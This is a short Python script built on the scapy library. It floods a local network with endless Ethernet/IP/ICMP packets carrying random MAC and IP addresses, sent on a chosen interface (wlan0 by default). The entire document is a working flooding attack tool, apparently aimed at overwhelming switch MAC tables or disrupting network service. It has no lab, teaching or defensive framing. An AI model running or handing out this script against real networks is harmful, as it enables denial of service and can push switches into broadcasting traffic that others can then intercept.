##! /usr/bin/python3

import sys
from scapy.all import *
from scapy.layers.l2 import *
from scapy.layers.inet import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
                dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"),
            dst=RandIP("*.*.*.*")) / \
         ICMP()

if len(sys.argv)<2:
    dev = "wlan0"
else:
    dev = sys.argv[1]

print("Flooding net with random packets on dev {}".format(dev))

sendp(packet, iface=dev, loop=1)